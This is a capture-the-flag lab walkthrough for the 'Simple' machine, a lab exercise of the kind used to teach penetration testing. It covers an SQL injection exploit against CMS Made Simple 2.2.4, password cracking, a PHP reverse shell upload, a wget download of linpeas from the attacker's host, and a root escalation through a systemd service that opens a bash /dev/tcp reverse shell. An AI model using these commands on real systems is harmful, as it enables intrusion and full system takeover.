# CyberSecLabs:SIMPLE 

```zsh
nmap -sS -p- -Pn -v -T4 172.31.1.2
```
You will see that port ```22``` and ```80```

Once you visit you will see a website running a CMS called ```CMS MADE SIMPLE``` with version ```2.2.4```

Run a dirsearch for directory fuzzing.
```zsh
python3 dirsearch.py -u http://172.31.1.3:80 -e r -R 3
```
Dirsearch is not an inbuilt tool. You can download/clone it from github.
> https://github.com/maurosoria/dirsearch

Now you will this in the result and when you visit it , it will take you to an admin login. Default creds and combination dinot work.
```http://172.31.1.2/admin/login.php```

```zsh 
searchsploit cms made simple 2.2.4
```

You will get this:
```
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
```
Copy it to your work folder 

```zsh
searchsploit -m php/webapps/46635.py
```
Now check it's usage using ```--help```

It is basically a Time Based Sqli. You can find resources on it and read on them over the internet.


```zsh
python 46635.py -u http://172.31.1.2 -c -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found: 18207a2929431d9f
[+] Username found: david
[+] Email found: david@simple.csl
[+] Password found: bbeabbca0fff4e851f840ffad0680dcf
[+] Password cracked: punisher
```
Now login with the creds ```david:punisher```. Once you go in visit the file manager and browse to
```uploads >> images```.

We will try to upload reverse shell here. But it will block it. Here they are doing a content based filteration. So my trick of double extension and changin ```content type``` header didnot work. I confirmed this by looking at the content type displayed by the app

Grab a php reverse shell and put it in your work folder.
```cp /usr/share/webshells/php/php-reverse-shell.php .```
Start a listener
```zsh
rlwrap nc -lvnp 443
```
Change your IP and put the port where you are listening. And now rename the php reverse shell file with ```.phtml```
Here is a small list which I like to try:
```php phtml, .php, .php3, .php4, .php5, and .inc```

Now when just visit the page and go to your listener, you will have a shell.

Browse to the home directory of the user (/home/david). Grab the user flag and now for privsec upload ```linpeas``` from your machine.

Host it using a python server where you :
 ```python -m SimpleHTTPServer 80```

And in the shell use ```wget``` to upload it.

```sh
wget http://10.10.0.40:80/linpeas.sh
```
Now run it using ```./linpeas.sh``` and you will see it highlighting ```/etc/systemctl```  with red and yellow which means it is 99 percent the privesc vector. 

I wrote a small service for it known as ```myserv.service ``` and uploaded it in the home directory of david.

```
[Unit]
Description = Bitchroot

[Service]
Type=Simple
user=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.0.40/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

Now, you can run it using the following commands in the sequence and start a listener which you specified in the service file.

```sh
/bin/systemctl enable /home/david/myserv.service

/bin/systemctl start myserv
```
Now you check the shell, you will have a root shell !
